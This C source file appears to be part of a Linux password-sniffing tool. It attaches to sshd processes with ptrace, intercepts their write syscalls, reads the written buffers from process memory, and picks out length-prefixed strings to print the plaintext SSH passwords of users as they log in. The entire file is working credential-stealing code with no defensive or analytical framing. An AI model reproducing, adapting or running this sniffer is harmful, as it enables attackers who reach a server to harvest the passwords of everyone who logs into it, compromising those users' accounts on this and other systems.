#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <string.h>

#define FILE_SSH_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;


char *extract_write_string(pid_t traced_process, long length) {
  char *strval = NULL;
  long str_ptr = 0;

  str_ptr = get_syscall_arg(traced_process, 1);
  strval = read_memory(traced_process, str_ptr, length);

  return strval;
}

// finds ssh password candidates in memory
char *find_password_write(char *memory, unsigned long len) {
  char *retval = NULL;
  char *strval = NULL;
  char *memory_copy = NULL;
  unsigned int checksum = 0;
  size_t slen = 0;


  if (len > MAX_SYSCALL_READ)
    len = MAX_SYSCALL_READ;

  memory_copy = (char *) calloc(sizeof(char) * len + 1, 1);

  if (len > 8) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * slen + 1, 1);

      if (!retval)
        return NULL;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

    strval = &memory_copy[8];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[1];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * slen + 1, 1);

      if (!retval) {
        return NULL;
      }

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

  }

  free(memory_copy);
  return NULL;
}

void intercept_ssh(pid_t traced_process) {
  char *write_string = NULL;
  char *password = NULL;
  int status = 0;
  int syscall = 0;
  long length = 0;
  struct user_regs_struct regs;

  memset(&regs, 0, sizeof(regs));
  ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status)) {
    goto exit_ssh;
  }

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    // Refresh the process name because sshd changes its process name  from
    // sshd: [accepted] to sshd: username [net]
    refresh_process_name(traced_process);
    syscall = get_syscall(traced_process);

    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_write) {
      length = get_reg(traced_process, eax);

      assert(errno == 0);

      //OPTIMIZATION NOTE: This check speeds things up, feel free to remove the if here
      //change MAX_PASSWORD_LEN in the config.h file to read larger passwords
      if (length <= 0 || length > MAX_PASSWORD_LEN) continue;

      write_string = extract_write_string(traced_process, length);
      password = find_password_write(write_string, length);

      if (password)
        output("%s\n", password);

      free(write_string);
      free(password);
      password = NULL;
      write_string = NULL;
    }
  }

exit_ssh:
  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}
